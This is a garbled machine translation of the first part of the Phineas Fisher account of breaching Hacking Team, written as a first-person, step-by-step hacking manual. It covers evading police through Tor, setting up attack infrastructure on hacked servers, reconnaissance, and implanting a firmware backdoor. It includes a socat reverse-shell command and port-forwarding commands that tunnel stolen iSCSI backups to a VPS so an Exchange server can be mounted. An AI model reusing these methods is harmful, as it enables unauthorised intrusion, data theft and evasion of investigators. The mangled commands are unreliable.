@@ -1,0 +1,442 @@
+[1 - Introduction] ------------------------------------------- ----------------
+
+You'll notice the language change since the last edition [1]. Speaking world, English already has books, lectures, guides, and information about spare
+hacking. In this world there are many better I hackers, but unfortunately. They squander their knowledge working for contractors "defense"
+for intelligence agencies to protect the banks and corporations and to defend the established order. The hacker culture was born in the US as a
+counterculture, but that source has remained in mere aesthetics - the rest has It has been assimilated. At least they can wear a shirt, dye her hair blue, hackers use their nicknames, and feel rebels while working for the system.
+
+Before someone had to sneak into the offices to filter documents [2]. a gun to rob a bank was needed. Today you can do it from bed with a laptop in hands [3] [4]. As the CNT said after the Gamma hack Group: "we try to take another step forward with new forms of struggle "[5]. The hack is a powerful tool, let us learn and let's fight!
+
+[1] http://pastebin.com/raw.php?i=cRYvK4jb
+[2] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI
+[3] http://www.aljazeera.com/news/2015/09/algerian-hacker-hero-hoodlum-150921083914167.html
+[4] https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf
+[5] http://madrid.cnt.es/noticia/consideraciones-sobre-el-ataque-informatico-a-gamma-group
+
+
+- [2 - Hacking Team] ------------------------------------------ ----------------
+
+Hacking Team was a company that helped governments to hack and spy on journalists, activists, political opponents, and other threats to their power
+[1] [2] [3] [4] [5] [6] [7] [8] [9] [10] [11]. And, very occasionally, criminals and terrorists [12]. A Vincenzetti, CEO, liked to finish his post with
+the fascist slogan "boia chi molla". It would be more successful "boia RCS sells chi". They also claimed to have technology to solve the "problem" of Tor and darknet [13]. But seeing that I still have my freedom, I have my doubts about their effectiveness.
+
+[1] http://www.animalpolitico.com/2015/07/el-gobierno-de-puebla-uso-el-software-de-hacking-team-para-espionaje-politico/
+[2] http://www.prensa.com/politica/claves-entender-Hacking-Team-Panama_0_4251324994.html
+[3] http://www.24-horas.mx/ecuador-espio-con-hacking-team-a-opositor-carlos-figueroa/
+[4] https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/
+[5] https://citizenlab.org/2014/02/hacking-team-targeting-ethiopian-journalists/
+[6] https://citizenlab.org/2015/03/hacking-team-reloaded-us-based-ethiopian-journalists-targeted-spyware/
+[7] http://focusecuador.net/2015/07/08/hacking-team-rodas-paez-tiban-torres-son-espiados-en-ecuador/
+[8] http://www.pri.org/stories/2015-07-08/these-ethiopian-journalists-exile-hacking-team-revelations-are-personal
+[9] https://theintercept.com/2015/07/07/leaked-documents-confirm-hacking-team-sells-spyware-repressive-countries/
+[10] http://www.wired.com/2013/06/spy-tool-sold-to-governments/
+[11] http://www.theregister.co.uk/2015/07/13/hacking_team_vietnam_apt/
+[12] http://www.ilmessaggero.it/primopiano/cronaca/yara_bossetti_hacking_team-1588888.html
+[13] http://motherboard.vice.com/en_ca/read/hacking-team-founder-hey-fbi-we-can-help-you-crack-the-dark-web
+
+
+- [3 - Be careful out there] ---------------------------------------- ------
+
+Unfortunately, our world is upside down. Enriches you do bad things and imprisons you do good things. Fortunately, thanks to the work
+hard for people such as "Tor project" [1], you can keep you from getting into the jail by a few simple guidelines:
+
+1) Encrypt your hard drive [2]
+
+I guess when the police arrive to impound your computer, mean you've already made many mistakes, but better safe than cure.
+
+2) Use a virtual machine and all traffic routed by Tor
+
+This accomplishes two things. First, that all connections are anonymized to through the Tor network. Second, keep personal life and anonymous life on different computers it helps you not to mix by accident.
+
+You can use projects like Whonix [3], Tails [4], Qubes TorVM [5], or something personalized [6]. Here [7] there is a detailed comparison.
+
+3) (Optional) Do not connect directly to the Tor network
+
+Tor is not the panacea. You can correlate the hours that you are connected Tor with the hours that your nickname is active hacker. There have also been successful attacks against the network [8]. You can connect to the Tor network through wifi others. Wifislax [9] is a Linux distribution with many
+tools to get wifi. Another option is to connect to a VPN or bridge node [10] before Tor, but is less secure because it still is they may correlate with hacker activity internet activity your home (this example was used as evidence against Jeremy Hammond
+[eleven]).
+
+The reality is that even though Tor is not perfect, it works quite well. When I was young and reckless, did many things without any protection (me
+referring to hacking) other than Tor, police made it impossible investigate, and I've never had problems.
+
+
+[1] https://www.torproject.org/
+[2] https://info.securityinabox.org/es/chapter-4
+[3] https://www.whonix.org/
+[4] https://tails.boum.org/
+[5] https://www.qubes-os.org/doc/privacy/torvm/
+[6] https://trac.torproject.org/projects/tor/wiki/doc/TransparentProxy
+[7] https://www.whonix.org/wiki/Comparison_with_Others
+[8] https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack/
+[9] http://www.wifislax.com/
+[10] https://www.torproject.org/docs/bridges.html.en
+[eleven] http://www.documentcloud.org/documents/1342115-timeline-correlation-jeremy-hammond-and-anarchaos.html
+
+
+---- [3.1 - Infrastructure] ----------------------------------------- ----------
+
+No hacking directly with output relays Tor. They are blacklisted, They are very slow, and you can not receive reverse connections. Tor serves to
+protect my anonymity while I connect to the infrastructure used for hack, which consists of:
+
+1) Domain Names
+
+Addresses used for command and control (C & C), and for tunnels
+DNS for insured egress.
+
+2) Stable Servers
+
+It serves to C & C servers to receive reverse shells, to launch
+attacks and keep the loot.
+
+3) Servers Hacked
+
+They serve as pivots to hide the IP of stable servers, and when I want a quick connection without pivot. For example scan ports, scan the whole internet, download a database with SQL injection, etc.
+
+Obviously you have to pay anonymously, as bitcoin (if you use it with watch out).
+
+
+---- [3.2 - Allocation] ----------------------------------------- ---------------
+
+Often in the news that have attributed an attack on a group of governmental hackers (the "APTs"), because they always use the same
+tools, leaving the same fingerprints, and even use the same infrastructure (domains, mail etc). They neglect because they can hack
+without legal consequences.
+
+I did not want to make it easier for police work and relate what Hacking Team with hacks and nicknames of my daily work as a hacker glove
+black. So I used new servers and domains registered with new post and paid with new bitcoin address. In addition, only I used tools
+public and things that I wrote especially for this attack and changed my way to do some things to keep my normal forensic trace.
+
+
+- [4 - Gathering Information] ------------------------------------------ ---------
+
+Although it can be tedious, this stage is very important, because the more larger the attack surface, the easier it will be to find a fault in a
+portion thereof.
+
+---- [4.1 - Technical Information] ---------------------------------------- -------
+
+Some tools and techniques are:
+
+1) Google
+
+You can find many unexpected things with a couple of good searches picked. For example, the identity of DPR [1]. The bible of how to use google to hack is the book "Google Hacking for Penetration Testers". You can also find a brief summary in Spanish in [2].
+
+2) Enumeration of subdomains
+
+Often the primary domain of a company is hosted by a third party, and you are getting the IP ranges of the company thanks to subdomains as
+mx.company.com, ns1.company.com etc. Also, sometimes there are things that should not be be exposed to "hidden" subdomains. Useful tools for
+discover domains and subdomains are fierce [3], theHarvester [4] and recon-ng [5].
+
+3) reverse lookups and searches whois
+
+With a reverse search using the whois information of a domain or range IPs of a company, you can find others of their domains and ranges
+IPs. To my knowledge, there is no free way to do reverse lookups whois, apart from a "hack" with google:
+
+"Via della Moscova 13" site: www.findip-address.com
+"Via della Moscova 13" site: domaintools.com
+
+4) Port scanning and fingerprinting
+
+Unlike other techniques, this speaks servers company. I include in this section because it is not an attack, it is only for gather information. The company IDS can generate an alert to scan ports, but you do not have to worry because all internet it is constantly being scanned.
+
+To scan, nmap [6] necessary, and can fingerprint most services discovered. For companies with very long ranges of IPs,
+ZMap [7] or masscan [8] are fast. WhatWeb [9] or BlindElephant [10]
+You can fingerprint websites.
+
+[1] http://www.nytimes.com/2015/12/27/business/dealbook/the-unsung-tax-agent-who-put-a-face-on-the-silk-road.html
+[2] http://web.archive.org/web/20140610083726/http://www.soulblack.com.ar/repo/papers/hackeando_con_google.pdf
+[3] http://ha.ckers.org/fierce/
+[4] https://github.com/laramies/theHarvester
+[5] https://bitbucket.org/LaNMaSteR53/recon-ng
+[6] https://nmap.org/
+[7] https://zmap.io/
+[8] https://github.com/robertdavidgraham/masscan
+[9] http://www.morningstarsecurity.com/research/whatweb
+[10] http://blindelephant.sourceforge.net/
+
+
+---- [4.2 - Social Information] ---------------------------------------- --------
+
+For social engineering, it is very useful to collect information about
+employees, their roles, contact information, operating system, browser,
+plugins, software, etc. Some resources are:
+
+1) Google
+
+Here too, it is the most useful tool.
+
+2) theHarvester and recon-ng
+
+I have already mentioned in the previous section, but have much more
+functionality. You can find a lot of information quickly and
+automated. Worth reading all documentation.
+
+3) LinkedIn
+
+You can find much information about the employees here. The
+Company recruiters are more likely to accept your requests.
+
+4) Data.com
+
+Formerly known as jigsaw. You have the contact information of many
+employees.
+
+5) Metadata file
+
+You can find lots of information about employees and their systems
+metadata files that the company has published. helpful Tools
+to find files on the website of the company and extract
+Metadata is metagoofil [1] and FOCA [2].
+
+[1] https://github.com/laramies/metagoofil
+[2] https://www.elevenpaths.com/es/labstools/foca-2/index.html
+
+
+- [5 - Entering the Network] ---------------------------------------- ------------
+
+There are several ways to make entry. Since the method I used for hacking
+team is rare and much more work than is usually necessary,
+I'll talk a bit about the two most common methods, I recommend trying
+First.
+
+
+---- [5.1 - Social Engineering] ---------------------------------------- ---------
+
+social engineering, spear phishing specifically, is responsible for the
+Most hacking today. For an introduction in Spanish, see [1].
+For more information in English, see [2] (the third part, "Targeted
+Attacks "). For social engineering amusing anecdotes generations
+past, see [3]. I did not want to try spear phishing against Hacking Team,
+because your business is to help governments to spear phish their opponents.
+Therefore there is a much higher risk that recognize and Hacking Team
+investigate this attempt.
+
+[1] http://www.hacknbytes.com/2016/01/apt-pentest-con-empire.html
+[2] http://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/
+[3] http://www.netcomunity.com/lestertheteacher/doc/ingsocial1.pdf
+
+
+---- [5.2 - Buy Access] ---------------------------------------- ------------
+
+Thanks to painstaking Russians and their exploit kits, smugglers trafficking, and
+bot herders, many companies already have compromised computers within
+their networks. Almost all Fortune 500, with their huge networks have a
+bots already inside. However, Hacking Team is a very small company, and
+Most employees are experts in computer security, then there was
+little chance that were already committed.
+
+
+---- [5.3 - Technical Operations] ---------------------------------------- -------
+
+After hacking Gamma Group, I described a process to search
+vulnerabilities [1]. Hacking Team has a range of public IP:
+inetnum: 93.62.139.32 - 93.62.139.47
+descr: HT public subnet
+
+Hacking Team had very little exposed to the internet. For example, different
+Gamma Group, your site customer needs a certificate
+client to connect. What he had was his main website (a blog Joomla
+that Joomscan [2] reveals no serious failure), a server post a
+pair of routers, two VPN devices, and a device for filtering spam.
+Then I had three options: find a 0day in Joomla, find a 0day in
+postfix, or find a 0day in one of the embedded systems. A 0day a
+embedded system seemed the most attainable option, and after two weeks
+reverse engineering work, I got a remote root exploit. Given the
+vulnerabilities have not yet been patched, I will not give more details.
+For more information on how to find these vulnerabilities, see
+[3] and [4].
+
+[1] http://pastebin.com/raw.php?i=cRYvK4jb
+[2] http://sourceforge.net/projects/joomscan/
+[3] http://www.devttys0.com/
+[4] https://docs.google.com/presentation/d/1-mtBSka1ktdh8RHxo2Ft0oNNlIp7WmDA2z9zzHpon8A
+
+
+- [6 - Be Prepared] ------------------------------------------ -------------
+
+I did a lot of work and testing before using the exploit against Hacking Team.
+I wrote a backdoor firmware, and compiled several tools
+post-exploitation for embedded system. The backdoor serves to protect the
+exploit. Use the exploit only once and then return by the backdoor ago
+work harder to find and patch vulnerabilities.
+
+The post-exploitation tools he had prepared were:
+
+1) busybox
+
+For all common UNIX utilities that the system did not.
+
+2) nmap
+
+To scan and fingerprint the internal network of Hacking Team.
+
+3) Responder.py
+
+The most useful tool to attack Windows networks when you have access to
+the internal network but do not have a domain user.
+
+4) Python
+
+To run Responder.py
+
+5) tcpdump
+
+To snoop traffic.
+
+6) dsniff
+
+Weak passwords to spy protocols such as ftp, and to make
+ARP spoofing. I wanted to use ettercap, written by the same ALOR and naga
+Hacking Team, but it was difficult to compile for the system.
+
+7) socat
+
+For a comfortable shell with pty:
+my_server: socat file: `tty`, raw, echo = 0 tcp-listen: mi_puerto
+Hacked system: socat exec: 'bash -li' pty, stderr, setsid, SIGINT, heal \
+tcp: my_server: I mi_puerto
+
+And for many other things, it is a Swiss Army knife of networking. See section
+Examples of documentation.
+
+8) screen
+
+As socat pty is not strictly necessary, but I wanted to feel
+at home in networks Hacking Team.
+
+9) a SOCKS proxy server
+
+To use with proxychains to access the internal network with any
+another program.
+
+10) tgcd
+
+To forward ports, as SOCKS server through the firewall.
+
+[1] https://www.busybox.net/
+[2] https://nmap.org/
+[3] https://github.com/SpiderLabs/Responder
+[4] https://github.com/bendmorris/static-python
+[5] http://www.tcpdump.org/
+[6] http://www.monkey.org/~dugsong/dsniff/
+[7] http://www.dest-unreach.org/socat/
+[8] https://www.gnu.org/software/screen/
+[9] http://average-coder.blogspot.com/2011/09/simple-socks5-server-in-c.html
+[10] http://tgcd.sourceforge.net/
+
+
+The worst that could happen was that my backdoor or post-exploitation tools
+dejasen unstable the system and make an employee to investigate. By
+So I spent a week trying my exploit, backdoor, and tools
+post-operation over networks of other vulnerable companies before entering
+Network Hacking Team.
+
+
+- [7 - Look and Listen] ----------------------------------------- ----------
+
+Now within the internal network, I want to take a look and think before giving
+the next step. I turn Responder.py in analysis mode (-A, to listen without
+Poisoned answers), and make a slow scan with nmap.
+
+
+- [8 - NoSQL databases] ---------------------------------------- ----------
+
+NoSQL, or rather NoAutenticación has been a great gift to the community
+hacker [1]. When I worry that they have finally patched all failures
+Authentication Bypass in MySQL [2] [3] [4] [5] put new fashion base
+Data unauthenticated by design. Nmap is a few on the net
+Internal Hacking Team:
+
+27017 / tcp open MongoDB MongoDB 2.6.5
+| mongodb-databases:
+| ok = 1
+| totalSizeMb = 47547
+| totalSize = 49856643072
+...
+| _ Version = 2.6.5
+
+27017 / tcp open MongoDB MongoDB 2.6.5
+| mongodb-databases:
+| ok = 1
+| totalSizeMb = 31987
+| totalSize = 33540800512
+| DATABASES
+...
+| _ Version = 2.6.5
+
+Were the databases for RCS test instances. The audio recording
+RCS is stored in MongoDB with GridFS. The audio folder on torrent [6]
+It comes from this. Unwittingly they spied on themselves.
+
+[1] https://www.shodan.io/search?query=product%3Amongodb
+[2] https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
+[3] http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0001.html
+[4] http://downloads.securityfocus.com/vulnerabilities/exploits/hoagie_mysql.c
+[5] http://archives.neohapsis.com/archives/bugtraq/2000-02/0053.html
+[6] https://ht.transparencytoolkit.org/audio/
+
+
+- [9 - Cables Cruzados] ------------------------------------------ -------------
+
+Although it was fun to listen to recordings and view images Hacking webcam
+Team developing its malware was not very useful. Unsteady copies of
+security vulnerability were opened. according to his
+documentation [1], its iSCSI devices must be on a separate network,
+but nmap find some in your 192.168.1.200/24 ??subnet:
+
+Nmap scan report for ht-synology.hackingteam.local (192.168.200.66)
+...
+3260 / tcp open iscsi?
+| iscsi-info:
+| Target: iqn.2000-01.com.synology: ht-synology.name
+| Address: 192.168.200.66:3260,0
+| _ Authentication: No authentication required
+
+Nmap scan report for synology-backup.hackingteam.local (192.168.200.72)
+...
+3260 / tcp open iscsi?
+| iscsi-info:
+| Target: iqn.2000-01.com.synology: synology-backup.name
+| Address: 10.0.1.72:3260,0
+| Address: 192.168.200.72:3260,0
+| _ Authentication: No authentication required
+
+iSCSI requires a kernel module, and compile it would have been difficult for the
+embedded system. I forwarded the port to mount from a VPS:
+
+VPS: tgcd -L -p 3260 -q 42838
+Embedded system: tgcd -C -s -c 192.168.200.72:3260 VPS_IP: 42838
+
+VPS: iscsiadm discovery -m -p -t 127.0.0.1 SendTargets
+
+Now you find the name iqn.2000-01.com.synology iSCSI but has problems
+when mounting because he believes his address is 192.168.200.72 instead of
+127.0.0.1
+
+The way I solved was:
+iptables -t nat -A OUTPUT -d -j 192.168.200.72 DNAT --to-destination 127.0.0.1
+
+And now after:
+-m node iscsiadm --targetname = iqn.2000-01.com.synology: 192.168.200.72 -p synology-backup.name --login
+
+... The device file appears! We ride:
+vmfs-fuse -o ro / dev / sdb1 / mnt / tmp
+
+and we find backups of multiple virtual machines. The server
+Exchange seems most interesting. It is too large to download,
+but we can mount remote and look for interesting files:
+$ Losetup / dev / loop0 Exchange.hackingteam.com-flat.vmdk
+$ Fdisk -l / dev / loop0
+/ Dev / loop0p1 2048 1258287103 629142528 7 HPFS / NTFS / exFAT
+
+then the offset is 2048 * 512 = 1048576
+1048576 $ losetup -o / dev / loop1 / dev / loop0
+$ Mount -o ro / dev / loop1 / mnt / exchange /
+
+now in / mnt / exchange / WindowsImageBackup / EXCHANGE / Backup 172311 10/14/2014
+We find the hard drive of the virtual machine, and assemble:
+vdfuse -r -t -f VHD f0f78089-D28a-11e2-a92c-005056996a44.vhd / mnt / vhd-disk /
+mount -o loop / mnt / vhd-disk / Partition1 / mnt / part1
+
+... And finally we unpacked the doll and we can see all
+the old Exchange server files in / mnt / part1
+
+[1] https://ht.transparencytoolkit.org/FileServer/FileServer/Hackingteam/InfrastrutturaIT/Rete/infrastruttura%20ht.pdf
